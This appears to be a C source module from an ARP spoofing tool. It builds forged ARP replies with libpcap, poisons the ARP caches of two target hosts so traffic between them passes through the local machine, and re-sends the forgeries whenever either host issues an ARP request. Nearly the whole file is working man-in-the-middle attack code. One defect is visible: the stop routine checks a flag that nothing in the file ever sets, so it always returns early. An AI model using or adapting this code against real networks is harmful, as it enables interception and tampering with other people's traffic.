#include <string.h>
#include <stdlib.h>

#include "resolve.h"
#include "def.h"
#include "util.h"


static bool       spoof_running = false;
static pcap_t    *pcap_handle;
static Host       local;
static Host       targets[TARGETS];
static ARPPacket  packets[TARGETS];
static uint8_t    packet_buffer[TARGETS][PACKET_LEN];


static void write_packet      (ARPPacket *p, uint8_t *b, bool gratuitous);
static void respoof           (u_char *u, const struct pcap_pkthdr *h, const u_char *p);
static void init_packets      (ARPPacket *p1,  ARPPacket *p2, bool gratuitous);
static void send_spoof_packet (enum target T);


static void write_packet(ARPPacket *packet, uint8_t *pbuff, bool gratuitous)
{
    EthernetHeader eth_h;
    memcpy(&eth_h.target_addr, packet->des_mac, MAC_SIZE);
    memcpy(&eth_h.sender_addr, packet->src_mac, MAC_SIZE);
    eth_h.protocol = htons(ETHER_TYPE_ARP);

    ARPHeader arp_h;
    arp_h.hardware_type = htons(1);
    arp_h.protocol_type = htons(ETH_P_IP);
    arp_h.hardware_addr_len = 6;
    arp_h.protocol_addr_len = 4;
    arp_h.operation = packet->operation;
    memcpy(&arp_h.sender_hardware_addr, packet->src_mac, MAC_SIZE);
    memcpy(&arp_h.sender_protocol_addr, packet->src_ip,  IP_SIZE);
    memcpy(&arp_h.target_hardware_addr, packet->des_mac, MAC_SIZE);

    if (gratuitous)
        memcpy(&arp_h.target_protocol_addr, packet->src_ip,  IP_SIZE);
    else
        memcpy(&arp_h.target_protocol_addr, packet->des_ip,  IP_SIZE);

    // Write headers to buffer
    memcpy(pbuff, &eth_h, ETH_HEADER_LEN);
    memcpy(pbuff + ETH_HEADER_LEN, &arp_h, ARP_HEADER_LEN);
}


static void respoof(__attribute__ ((unused)) u_char *user,
                    __attribute__ ((unused)) const struct pcap_pkthdr *header,
                    const u_char * packet)
{
    const ARPHeader *arp = (const ARPHeader*) (packet + ETH_HEADER_LEN);

    if (arp->operation != ARPOP_REQUEST)
        return;

    /* target 1 is sending an ARP request to target 2*/
    if (ip_match(arp->sender_protocol_addr, targets[T1].ip) &&
        ip_match(arp->target_protocol_addr, targets[T2].ip))
    {
        send_spoof_packet(T1);
        send_spoof_packet(T2);
        return;
    }

    /* Target 2 is sending an ARP request to target 1. */
    if (ip_match(arp->sender_protocol_addr, targets[T2].ip) &&
        ip_match(arp->target_protocol_addr, targets[T1].ip))
    {
        send_spoof_packet(T1);
        send_spoof_packet(T2);
        return;
    }
}


static void init_packets(ARPPacket *t1_spoof,  ARPPacket *t2_spoof,  bool grat)
{
    t1_spoof->operation = ARPOP_REPLY;
    memcpy(&(t1_spoof->src_ip), targets[T2].ip, IP_SIZE);
    memcpy(&(t1_spoof->des_ip), targets[T1].ip, IP_SIZE);
    memcpy(&(t1_spoof->src_mac), &local.mac, MAC_SIZE);
    memcpy(&(t1_spoof->des_mac), targets[T1].mac, MAC_SIZE);
    write_packet(t1_spoof, packet_buffer[T1], grat);

    t2_spoof->operation = ARPOP_REPLY;
    memcpy(&(t2_spoof->src_ip), targets[T1].ip, IP_SIZE);
    memcpy(&(t2_spoof->des_ip), targets[T2].ip, IP_SIZE);
    memcpy(&(t2_spoof->src_mac), &local.mac, MAC_SIZE);
    memcpy(&(t2_spoof->des_mac), targets[T2].mac, MAC_SIZE);
    write_packet(t2_spoof, packet_buffer[T2], grat);
}


static void send_spoof_packet(enum target T)
{
    if (verbose)
        print_packet(&packets[T]);

    pcap_inject(pcap_handle, (uint8_t*) &packet_buffer[T], PACKET_LEN);
}


static void send_unspoofs(void)
{
    uint8_t   buff[PACKET_LEN];
    ARPPacket pack;

    memcpy(&pack.des_ip, targets[T2].ip, IP_SIZE);
    memcpy(&pack.des_mac, targets[T2].mac, MAC_SIZE);
    memcpy(&pack.src_ip, targets[T1].ip, IP_SIZE);
    memcpy(&pack.src_mac, targets[T1].mac, MAC_SIZE);

    write_packet(&pack, buff, true);
    pcap_inject(pcap_handle, (uint8_t*) &buff, PACKET_LEN);

    memset(&pack, 0, sizeof(ARPPacket));

    memcpy(&pack.des_ip, targets[T1].ip, IP_SIZE);
    memcpy(&pack.des_mac, targets[T1].mac, MAC_SIZE);
    memcpy(&pack.src_ip, targets[T2].ip, IP_SIZE);
    memcpy(&pack.src_mac, targets[T2].mac, MAC_SIZE);

    write_packet(&pack, buff, true);
    pcap_inject(pcap_handle, (uint8_t*) &buff, PACKET_LEN);
}


void reply_spoof_init(pcap_t *pcap_h, Host t[TARGETS], Host *l, bool grat)
{
    pcap_handle = pcap_h;

    memcpy(&targets, t, sizeof(Host) * TARGETS);
    memcpy(&local, l, sizeof(Host));
    init_packets(&packets[T1], &packets[T2], grat);
}


int reply_spoof_run(void)
{
    send_spoof_packet(T1);
    send_spoof_packet(T2);

    return pcap_loop(pcap_handle, 0, respoof, NULL);
}


void reply_spoof_stop(void)
{
    if (!spoof_running)
        return;

    if (unspoof)
        send_unspoofs();

    pcap_breakloop(pcap_handle);
}
